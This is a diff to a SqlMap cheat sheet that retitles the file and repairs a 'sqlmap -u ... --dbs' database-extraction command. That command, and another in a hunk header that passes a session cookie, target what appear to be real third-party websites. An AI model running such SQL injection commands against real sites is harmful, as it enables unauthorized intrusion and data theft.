@@ -1,5 +1,5 @@
-SqlMap
-======
+# SqlMap Quick CheatSheet
+
 
 __URL WRITING__
 
@@ -63,7 +63,7 @@ sqlmap -u http://imranparray.com/welcom.php --cookie="PHPSESSID=adsaasd56454a6s5
 
 __Extract Databases__
 ```console
--u http://signisasia.net/becomemember.php?id=14 --dbs 	
+sqlmap -u http://signisasia.net/becomemember.php?id=14 --dbs 	
 ```
 __Extract Tables from database__
 ```console
